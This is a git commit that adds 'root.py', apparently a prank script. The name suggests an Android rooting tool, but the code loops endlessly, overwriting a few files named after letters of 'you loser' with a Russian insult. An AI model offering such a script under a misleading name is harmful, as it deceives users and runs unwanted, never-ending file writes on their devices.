5b296ef529e881627499ee6dbd52cd9a34ccccc2
artem-collab <58644376+artem-collab@users.noreply.github.com>
2019-12-30 17:22:58 +0400

    Create root.py

---
+++ root.py
@@ -0,0 +1,8 @@
+from random import choice
+import os
+os.system('cd /storage/emulated/0/Android')
+while True:
+    lol=choice('you loser')
+    with open(lol,'w') as lo:
+        lo.write('''
+Ты тупой лазер вот и всё''')
